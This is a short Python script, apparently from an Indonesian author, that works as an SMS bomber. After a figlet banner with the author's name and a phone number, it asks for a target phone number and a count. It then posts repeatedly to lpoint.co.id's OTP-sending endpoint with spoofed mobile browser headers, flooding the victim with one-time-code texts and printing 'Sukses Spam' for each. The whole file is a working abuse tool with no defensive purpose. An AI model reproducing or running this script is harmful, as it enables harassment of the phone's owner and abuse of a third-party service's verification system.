import os
import time
import sys


os.system('clear')
os.system('figlet welcome | lolcat')
time.sleep(2)
os.system('clear')
os.system('figlet sms | lolcat')
# ini        ↓ tinggal di ganti doank
print ("╔════════════════════════════════════════╗")
print ("║  Author  : ceperindo                   ║")
print ("║  Facebook: ajid                    ║")
print ("║  WhatsApp:+1(309)2335936                 ║")
print ("╚════════════════════════════════════════╝")
print ("\t╔═══════════════════╗")
import requests
sor = requests.Session()
no = input('nomor (08) : ')
jml = int(input('Jumlah : '))
hea = {
"Host": "www.lpoint.co.id",
"Connection": "keep-alive",
"Content-Length": "85",
"Accept": "application/json, text/javascript, */*; q=0.01",
"X-Requested-With": "XMLHttpRequest",
"Save-Data": "on",
"User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"Origin": "https://www.lpoint.co.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://www.lpoint.co.id/app/member/MBRJ.do",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

dat = {
"pn":"",
"bird":"",
"webMbrId":"",
"webPwd":"",
"maFemDvC":"",
"cellNo":no,
"otpNo":"",
"seq":"",
"otpChk":"N",
"count":""}

for i in range(jml):
         an = sor.post('https://www.lpoint.co.id/app/member/ESYMBRJOTPSEND.do',headers=hea,data=dat).text
         print('Sukses Spam ke '+no+str(i))
print('Done')
